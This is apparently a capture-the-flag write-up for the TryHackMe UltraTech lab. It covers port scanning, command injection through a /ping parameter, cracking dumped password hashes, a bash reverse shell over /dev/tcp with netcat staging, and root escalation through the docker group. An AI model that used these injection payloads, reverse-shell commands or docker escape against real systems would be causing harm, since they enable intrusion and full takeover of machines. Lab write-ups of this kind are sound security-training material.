https://tryhackme.com/r/room/ultratech1
# IP 
```
10.10.151.132
```
# NMAP
```bash
nmap -p- -T4 10.10.151.132 -v
21
22
8081
31331

nmap -sV -sC 10.10.151.132 -v -p21,22,8081,31331
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-title: Site doesnt have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```
# Web
## Port 8081
some node.js web app

```bash
dirb http://10.10.151.132:8081/
# result
/auth
```

`/auth`
```
You must specify a login and a password
```
if no place, then maybe as a parameter

`http://10.10.151.132:8081/auth?login=a&password=b`
```
Invalid credentials
```

`/ping`
```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

## Port 31331
apache soft on ubuntu is here
```bash
dirb http://10.10.151.132:31331/
# results
robots.txt

```

`/robots.txt`
```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```
`utech_sitemap.txt`
```
/
/index.html
/what.html
/partners.html
```

`/partners.html` -> login form and there is 
`/js/api.js`
```js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();

```
which means that `/ping?ip=`can be abused
## Port 8081
https://book.hacktricks.xyz/pentesting-web/command-injection
`/ping?ip=10.8.97.245 %0A ls`
```
index.js node_modules package.json package-lock.json start.sh utech.db.sqlite 
```

`/ping?ip=10.8.97.245 %0A cat utech.db.sqlite`
```
SQLite format 3@ .,P zz��etableusersusersCREATE TABLE users ( login Varchar, password Varchar, type Int ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84
```
https://crackstation.net/
it gives us `r00t:f357a0c52799563c7c7b76c1e7543a32:n100906`
and `admin:0d0ea5111e3c1def594c1684e3b9be84:mrsheafy`

`http://10.10.151.132:8081/auth?login=admin&password=mrsheafy`
```
Restricted area

Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1

```

## Rev shell
to get rev shell:
`/ping?ip=10.8.97.245 %0A bash -i >& /dev/tcp/10.8.97.245/4242 0>&1`, but it will not work because it escapes some characters.

My solution
```bash
# on terminal
nc -lvnp 1234
# on browser
/ping?ip=10.8.97.245 %0A nc 10.8.97.245 1234 > a.sh
# on terminal
bash -i >& /dev/tcp/10.8.97.245/4242 0>&1
# ctrl+c
nc -lvnp 4242
# on browser
/ping?ip=10.8.97.245 %0A /bin/bash a.sh
```

shell stabilization
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg
```

# PrivEsc
```
www@ultratech-prod:~/api$ whoami
www
```
Let's user the creds `r00t:n100906`
```
r00t@ultratech-prod:~$ whoami
r00t
```

Privesc
```
r00t@ultratech-prod:~$ groups
r00t docker
```
https://gtfobins.github.io/gtfobins/docker/
```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
```
